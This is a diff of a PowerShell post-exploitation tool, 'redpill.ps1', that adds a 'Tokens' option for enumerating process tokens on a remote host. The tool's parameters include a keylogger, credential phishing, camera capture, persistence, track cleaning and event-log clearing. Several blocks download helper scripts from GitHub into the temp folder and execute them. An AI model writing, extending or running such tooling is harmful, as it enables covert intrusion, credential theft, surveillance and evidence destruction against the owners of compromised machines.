@@ -70,7 +70,7 @@
    [string]$ProcessName="false", [string]$CleanTracks="false", [string]$GetDnsCache="false",
    [string]$Parameters="false", [string]$PhishCreds="false", [string]$GetProcess="false",
    [string]$ApacheAddr="false", [string]$Storage="$Env:TMP", [string]$SpeakPrank="false",
-   [string]$TaskName="redpill", [string]$Keylogger="false", [string]$PingSweep="false",
+   [string]$TaskName="RedPillTask", [string]$Keylogger="false", [string]$PingSweep="false",
    [string]$FileMace="false", [string]$GetTasks="false", [string]$Persiste="false",
    [string]$BruteZip="false", [string]$NetTrace="false", [string]$SysInfo="false",
    [string]$GetLogs="false", [string]$Upload="false", [string]$Camera="false",
@@ -78,7 +78,7 @@
    [string]$Date="false", [string]$ADS="false", [string]$Help="false",
    [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
-   [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
+   [int]$BeaconTime='10', [int]$Interval='1', [int]$NewEst='10',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
    [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
@@ -141,7 +141,7 @@ $ListParameters = @"
   -GetConnections   Enum|Verbose         Enumerate Remote Host Active TCP Connections
   -GetDnsCache      Enum|Clear           Enumerate\Clear remote host DNS cache entrys
   -GetInstalled     Enum                 Enumerate Remote Host Applications Installed
-  -GetProcess       Enum|Kill            Enumerate OR Kill Remote Host Running Process(s)
+  -GetProcess       Enum|Kill|Tokens     Enumerate OR Kill Remote Host Running Process(s)
   -GetTasks         Enum|Create|Delete   Enumerate\Create\Delete Remote Host Running Tasks
   -GetLogs          Enum|Verbose|Clear   Enumerate eventvwr logs OR Clear All event logs
   -GetBrowsers      Enum|Verbose|Creds   Enumerate Installed Browsers and Versions OR Verbose 
@@ -413,17 +413,26 @@ If($GetInstalled -ieq "Enum"){
    Start-Sleep -Seconds 1
 }
 
-If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
+If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill" -or $GetProcess -ieq "Tokens"){
 
    <#
    .SYNOPSIS
      Author: @r00t-3xp10it
-     Helper - Enumerate/Kill running process
+     Helper - Enumerate/Kill running process/Tokens
 
    .DESCRIPTION
       This CmdLet enumerates 'All' running process if used
       only the 'Enum' @arg IF used -ProcessName parameter
       then cmdlet 'kill' or 'enum' the sellected processName.
+
+   .NOTES
+      -GetProcess Tokens @argument requires Admin privileges
+
+   .Parameter GetProcess
+      Accepts arguments: Enum, Kill and Tokens
+
+   .Parameter ProcessName
+      Accepts the process name to be query or kill
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Enum
@@ -436,6 +445,10 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
       Kill Remote Host firefox.exe Running Process
+
+   .EXAMPLE
+      PC C:\> powershell -File redpill.ps1 -GetProcess Tokens
+      Enum ALL user process tokens and queries them for details
 
    .OUTPUTS
       Id              : 5684
@@ -455,7 +468,7 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetProcess.ps1 -Destination $Env:TMP\GetProcess.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetProcess.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,65234375/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,8876953125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetProcess.ps1"){Remove-Item -Path "$Env:TMP\GetProcess.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -469,6 +482,8 @@ If($GetProcess -ieq "Enum" -or $GetProcess -ieq "Kill"){
       powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Enum -ProcessName $ProcessName
    }ElseIf($GetProcess -ieq "Kill"){
       powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess kill -ProcessName $ProcessName
+   }ElseIf($GetProcess -ieq "Tokens"){
+      powershell -File "$Env:TMP\GetProcess.ps1" -GetProcess Tokens
    }
 
    ## Clean Old files left behind
@@ -518,7 +533,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetTasks.ps1 -Destination $Env:TMP\GetTasks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetTasks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,361328125/KB
+      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,4892578125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2184,25 +2199,38 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @r00t-3xp10it
-      Helper - Enumerate/Kill running process
+     Author: @r00t-3xp10it
+     Helper - Enumerate/Kill running process/Tokens
 
    .DESCRIPTION
       This CmdLet enumerates 'All' running process if used
       only the 'Enum' @arg IF used -ProcessName parameter
       then cmdlet 'kill' or 'enum' the sellected processName.
 
+   .NOTES
+      -GetProcess Tokens @argument requires Admin privileges
+
+   .Parameter GetProcess
+      Accepts arguments: Enum, Kill and Tokens
+
+   .Parameter ProcessName
+      Accepts the process name to be query or kill
+
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Enum
       Enumerate ALL Remote Host Running Process(s)
 
    .EXAMPLE
-      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName powershell.exe
-      Enumerate powershell.exe Process {Id,Name,Path,Description,Company,StartTime,Responding}
+      PC C:\> powershell -File redpill.ps1 -GetProcess Enum -ProcessName firefox.exe
+      Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Kill -ProcessName firefox.exe
       Kill Remote Host firefox.exe Running Process
+
+   .EXAMPLE
+      PC C:\> powershell -File redpill.ps1 -GetProcess Tokens
+      Enum ALL user process tokens and queries them for details
 
    .OUTPUTS
       Id              : 5684
@@ -2241,7 +2269,7 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetTasks Create
-      Use module default settings to create demonstration task
+      Use module default settings to create one demonstration task
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetTasks Delete -TaskName mytask
